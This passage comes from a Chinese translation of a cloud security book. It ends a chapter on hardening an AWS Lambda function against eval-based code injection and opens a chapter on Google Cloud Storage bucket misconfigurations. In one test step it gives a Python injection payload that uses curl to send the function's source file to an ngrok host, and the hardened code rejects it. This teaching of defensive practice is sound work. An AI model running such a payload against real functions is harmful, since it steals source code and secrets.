

更新后的 Lambda 函数代码因包含不支持的 AST 节点而拒绝了恶意表达式。在幕后，`_eval()` 函数（位于 `eval_expr()` 函数内部）引发了 `TypeError`，从而阻止了恶意表达式被求值。

### Note

`eval_expr()` 函数仅支持对应于安全算术操作的一组有限的 AST 节点。支持的节点包括用于数字的 `ast.Num` 和 `ast.Constant`，用于二元操作的 `ast.BinOp`（加法、减法、乘法、除法、取模、指数运算），以及用于一元操作的 `ast.UnaryOp`（取反）。任何其他节点类型都会被拒绝以防止代码注入。

11. 检查你是否可以使用以下表达式外泄 Lambda 函数的源代码：

```
__import__('os').system('curl -X POST --data-binary @/var/task/lambda_function.py https://[GENERATED_ID].ngrok-free.app')
```

这会返回以下输出：

```
Invalid or unsafe expression
```

### Caution

本章中的动手模拟是有意简化的，并未涵盖或解决每一种可能的风险。在保护真实世界的无服务器应用程序时，请务必考虑本书未涵盖的其他潜在漏洞。

到目前为止，你应该对如何防范 Lambda 函数中的代码注入漏洞有了很好的了解。请记住，实现这一点的方法有很多，而我们只涵盖了一种可能的方法。随着你在后续章节中探索攻击者如何利用无服务器函数中的代码注入漏洞，你将学习这些攻击的不同变体，并能更有效地进行防御。

### Caution

现在你已完成本章和前三章中的动手示例，请务必检查并删除你在 AWS 账户中创建的所有资源。留下不再使用的资源可能会导致不必要的费用，并使你的账户暴露于潜在的安全风险。

# Summary

在本章中，你配置了 Lambda 函数使其使用具有受限出站访问的 VPC，并重构了函数代码以消除对 `eval()` 的使用，从而防范代码注入攻击。通过逐步的模拟和详细的示例，你获得了识别漏洞并更有效地保护 Lambda 函数的知识和实践经验。

在下一章中，你将把重点转向 Google Cloud，并探索攻击者如何利用云存储桶配置错误来暴露或窃取敏感数据。你将模拟诸如悬空存储桶接管之类的场景，并研究对已删除存储桶的残留引用如何被滥用于恶意目的。最后，你将学习如何使用 IaC 强制执行安全的存储桶配置，以最大程度地降低代价高昂的配置错误风险。

^[1](#ch07.html#id710-marker) *互联网网关* 是 VPC 组件，允许 VPC 中的资源向互联网发送和接收流量。*NAT 网关* 是 VPC 组件，允许私有子网中的资源访问互联网，同时阻止入站流量直接到达它们。

^[2](#ch07.html#id716-marker) 你的 VPC 将只包含一个子网。

^[3](#ch07.html#id723-marker) 该函数应生成与附加到 VPC 之前相同的日志输出集。

^[4](#ch07.html#id724-marker) 也就是说，你已成功将函数附加到自定义 VPC。

^[5](#ch07.html#id728-marker) CORS 头是允许浏览器从不同源访问资源的 HTTP 头。在 API Gateway 中，配置这些头允许你的 API 从托管在不同域或端口上的客户端应用程序调用。

^[6](#ch07.html#id737-marker) 我不会在本書中详细介绍 Amazon API Gateway 的全部细节。想了解更多，请查看 AWS re:Invent 2023 会议 [“I Didn’t Know Amazon API Gateway Did That (SVS323)”](https://oreil.ly/1__-g)。

^[7](#ch07.html#id738-marker) 为跟进操作，请使用来自 `vulnerable-lambda-function-backend` GitHub 仓库的 [此 Lambda 函数代码](https://oreil.ly/2EtpN)。

^[8](#ch07.html#id739-marker) 尽管此配置限制了浏览器中的访问，但客户端仍可通过使用 `curl` 或 Postman 等工具以编程方式调用 API。

^[9](#ch07.html#id746-marker) 你应该能找到两组这些日志消息，每组对应 Lambda 函数处理的单独请求。你可能需要展开 CloudWatch Logs 中的日志条目以查看完整的消息集，尤其是当某些行默认被折叠或截断时。

^[10](#ch07.html#id750-marker) 为跟进操作，请使用来自 `vulnerable-lambda-function-backend` GitHub 仓库的 [此 Lambda 函数代码](https://oreil.ly/1EMvm)。

^[11](#ch07.html#id751-marker) 我使用生成式 AI 工具帮助重构原始代码，并用更安全的替代实现替换不安全的 `eval()` 函数。

^[12](#ch07.html#id752-marker) 例如，如果输入字符串是 `(40 - 2) * 5`，函数会将此表达式解析为抽象语法树，其中操作（如减法和乘法）和操作数（数字）成为节点。求值器函数随后通过递归处理每个节点并仅应用 `operators` 字典中定义的允许算术运算来安全地计算结果。

^[13](#ch07.html#id753-marker) 你可以考虑设置自动化测试，以确保即使在进行大量代码更改后，安全表达式仍能被正确求值。

# Chapter 8. Hacking and Securing Google Cloud Storage Buckets

由于无服务器函数和支持无服务器计算模型的云资源本质上通常是短暂的，因此无服务器应用程序利用云存储和数据库服务来存储必须独立于短暂计算资源而持久存在的数据。例如，一个照片分享应用可能会将上传的照片、日志和静态资源存储在 Google Cloud Storage 存储桶中，而用户账户数据则单独存储在专用数据库中。同样，一个电子商务平台可能会在多个存储桶中存储用户文档、交易收据和订单发票。想象一下，你不小心将一个包含上传的护照扫描件的存储桶暴露给了公众！由于存储桶是公开可访问的，攻击者可以轻松下载这些文件，使你的应用程序用户面临身份盗用的风险。这种疏忽可能迅速升级为导致法律、财务和声誉后果的全面数据泄露。

云存储配置错误占云中数据泄露的相当大比例。在本章中，你将深入研究 Cloud Storage 存储桶安全配置错误，并了解攻击者如何利用它们来未经授权访问文件和信息。你将模拟一次悬空存储桶接管，并探索攻击者如何滥用对已删除存储桶的残留引用。最后，你将学习如何使用 IaC 强制执行安全的存储桶配置，以最大程度地降低代价高昂的配置错误风险。

本章将涵盖以下内容：

*   [“Exploring Cloud Storage Bucket Security Misconfigurations”](#ch08.html#exploring_cloud_storage_bucket_security_misconfigurations_ch08-hacking-and-securing-misconfigured-google-cloud-storage-buckets_1762889437589)

*   [“Simulating a Dangling Bucket Takeover”](#ch08.html#simulating_a_dangling_bucket_takeover_ch08-hacking-and-securing-misconfigured-google-cloud-storage-buckets_1762889475088)

*   [“Enforcing Secure Bucket Configuration with Infrastructure as Code”](#ch08.html#enforcing_secure_bucket_configuration_with_infrastructure_as_code_ch08-hacking-and-securing-misconfigured-google-cloud-storage-buckets_1762889493739)

